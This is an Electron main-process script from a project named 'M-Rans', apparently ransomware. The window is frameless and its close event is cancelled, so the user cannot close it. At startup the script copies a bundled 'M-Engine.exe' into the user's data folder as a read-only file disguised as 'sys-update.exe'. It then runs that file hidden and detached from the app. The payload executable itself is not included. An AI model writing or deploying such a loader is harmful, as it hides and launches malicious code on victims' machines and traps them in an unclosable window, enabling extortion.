// # Electron Main Process //
// This script is the main entry point for an Electron application.//
// 2025 M-Rans® v2.0.0 - 2025 M-Rans Team //
// This file is part of M-Rans, a project developed by the M-Rans Team. //
// -----------------------------------**--------------------------------------- //
const { app, BrowserWindow } = require('electron');
const path = require('path'); // Importing the path module to handle file paths
const fs = require('fs'); // Importing the fs module to handle file system operations
const { spawn } = require("child_process"); // Importing the child_process module to execute shell commands
let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1080,
    height: 610,
    frame: false,
    resizable: true,
    icon: path.join(__dirname, 'icon.ico'),
    webPreferences: {
      nodeIntegration: true,
    },
  });

  mainWindow.loadURL(`file://${path.join(__dirname, 'index.html')}`);

  mainWindow.on('close', (e) => {
    e.preventDefault() 
  })

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

app.on('ready', () => {

  createWindow();
  
  const es = path.join(process.resourcesPath, 'app.asar.unpacked', 'resources', 'M-Engine.exe');

  const ed = path.join(app.getPath('userData'), 'sys-update.exe');

  if (!fs.existsSync(ed)) { 
    fs.copyFileSync(es, ed); 
    fs.chmodSync(ed, 0o444);
  }

  spawn(ed, [], { detached: true, stdio: "ignore", windowsHide: true, shell: true }).unref();
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (mainWindow === null) createWindow();
});
